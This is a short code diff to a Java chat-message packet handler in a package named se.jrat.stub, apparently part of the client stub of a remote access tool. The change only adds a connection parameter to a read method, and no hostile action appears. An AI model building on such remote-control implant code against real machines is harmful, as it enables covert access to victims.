@@ -13,7 +13,7 @@ import se.jrat.stub.Connection;
 public class Packet51ChatMessage extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		if (Connection.instance.getFrameChat() != null) {
 			String message = Connection.instance.readLine();
 			StyleContext sc = StyleContext.getDefaultStyleContext();
